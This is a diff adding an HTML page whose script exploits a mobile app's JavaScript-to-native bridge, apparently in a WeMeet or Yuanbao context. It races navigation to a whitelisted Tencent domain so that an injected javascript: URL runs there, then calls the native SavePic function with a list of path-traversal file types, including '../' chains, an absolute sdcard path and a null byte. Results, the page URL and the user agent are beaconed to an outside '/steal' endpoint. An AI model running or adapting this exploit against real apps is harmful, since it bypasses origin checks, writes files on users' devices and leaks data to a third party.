@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>Race SavePic Traversal</title></head>
+<body>
+<h2>Race - SavePic Path Traversal Probe</h2>
+<pre id="log" style="font-size:10px;white-space:pre-wrap;"></pre>
+<script>
+var log = document.getElementById('log');
+function addLog(s) { log.textContent += '[' + Date.now() + '] ' + s + '\n'; }
+
+// ═══════════════════════════════════════════════════════════
+// 配置
+// ═══════════════════════════════════════════════════════════
+var EXFIL   = 'https://test2.lleavesg.top/steal';
+// 真正能拉到图的 URL —— 下面几个任选一个：
+var IMG_URL = 'https://www.baidu.com/img/flexible/logo/pc/result.png';
+// var IMG_URL = 'https://httpbin.org/image/png';
+// var IMG_URL = 'https://dummyimage.com/100x100/000/fff.png';
+// var IMG_URL = 'https://placehold.co/100x100.png';
+// 注意：不能用 http:// (WeMeet 下载器会拒)，也不能用你自己的 exfil 域
+// （exfil 拿不到 /probe.png 的话就换成这里这个稳定公开的 CDN）
+// ═══════════════════════════════════════════════════════════
+
+// 每个 payload 的 ext（type 字段）尝试不同形态
+var PAYLOADS = [
+    { k: 'baseline',      t: 'png' },
+    { k: 'one_up',        t: 'png/../evil' },
+    { k: 'two_up',        t: 'png/../../evil' },
+    { k: 'three_up',      t: 'png/../../../savepic_mark_3up' },
+    { k: 'four_up',       t: 'png/../../../../savepic_mark_4up' },
+    { k: 'to_databases',  t: 'png/../../../databases/savepic_mark_db' },
+    { k: 'to_files_root', t: 'png/../../savepic_mark_files' },
+    { k: 'dot_slash',     t: './../evil' },
+    { k: 'leading_slash', t: '/../../evil' },
+    { k: 'absolute_sd',   t: '/sdcard/Download/savepic_mark_abs' },
+    { k: 'null_byte',     t: 'png\u0000evil' },
+    { k: 'dots_only',     t: '../../../marker_dots' },
+    { k: 'long_ext',      t: 'png' + new Array(400).join('A') }
+];
+
+// 构造在 yuanbao.tencent.com 上下文执行的 javascript: payload
+function buildJsUrl() {
+    var code = 'void(';
+
+    // SavePic 持久回调（Java 侧 MediaStore 写完会回调这里）
+    code += 'window.savePicCallback=function(a){try{new Image().src="' + EXFIL +
+            '?t=spcb&r="+encodeURIComponent(typeof a==="string"?a.slice(0,500):JSON.stringify(a).slice(0,500))}catch(e){}};';
+
+    // 每个 payload 的同步回调（handler 返回时的 code/err_msg）
+    PAYLOADS.forEach(function(p, i) {
+        code += 'window.cb_' + i + '=function(a){try{new Image().src="' + EXFIL +
+                '?t=cb&k=' + encodeURIComponent(p.k) +
+                '&r="+encodeURIComponent(typeof a==="string"?a.slice(0,300):JSON.stringify(a).slice(0,300))}catch(e){}};';
+    });
+
+    // 触发信号
+    code += 'try{new Image().src="' + EXFIL + '?t=jsrun&at="+Date.now()+"&url="+encodeURIComponent(location.href)}catch(e){};';
+
+    // 依次调 SavePic
+    PAYLOADS.forEach(function(p, i) {
+        var req = {
+            callback: 'cb_' + i,
+            module:   'CommonPlugin',
+            method:   'SavePic',
+            param:    { url: IMG_URL, type: p.t },
+            callId:   'sp' + i
+        };
+        code += 'try{JSCallJavaMgr.JSCallNative(' + JSON.stringify(JSON.stringify(req)) + ')}catch(e){};';
+    });
+
+    code = code.replace(/;$/, '') + ')';
+    return 'javascript:' + code;
+}
+
+var js = buildJsUrl();
+
+var c = 0;
+function sendOne() {
+    c++;
+    var req = JSON.stringify({
+        callback: 'cb_load_' + c,
+        module:   'CommonPlugin',
+        method:   'LoadUrl',
+        param:    { url: js },
+        callId:   'c' + c
+    });
+    JSCallJavaMgr.JSCallNative(req);
+}
+
+function doRace() {
+    if (!window.JSCallJavaMgr) { addLog('ERROR: no JSCallJavaMgr'); return; }
+    addLog('bridge OK');
+    addLog('URL: ' + location.href);
+    addLog('js payload length: ' + js.length);
+    addLog('payloads: ' + PAYLOADS.length);
+
+    try {
+        new Image().src = EXFIL + '?t=start&len=' + js.length +
+                          '&p=' + PAYLOADS.length + '&ua=' +
+                          encodeURIComponent(navigator.userAgent.slice(0, 80));
+    } catch(e) {}
+
+    // 触发 URL 更新到白名单域
+    location.href = "https://yuanbao.tencent.com/";
+
+    // 竞态窗口 Phase 1（高频轰炸）
+    for (var i = 0; i < 500; i++) {
+        try { sendOne(); } catch(e) { break; }
+    }
+
+    // 竞态窗口 Phase 2（梯度延迟）
+    for (var d = 0; d <= 500; d += 50) {
+        (function(delay) {
+            setTimeout(function() {
+                for (var j = 0; j < 50; j++) {
+                    try { sendOne(); } catch(e) { return; }
+                }
+            }, delay);
+        })(d);
+    }
+
+    addLog('Phase1 fired: ' + c + ' LoadUrls');
+}
+
+setTimeout(function() {
+    addLog('Starting in 2s...');
+    setTimeout(doRace, 2000);
+}, 500);
+</script>
+</body>
+</html>
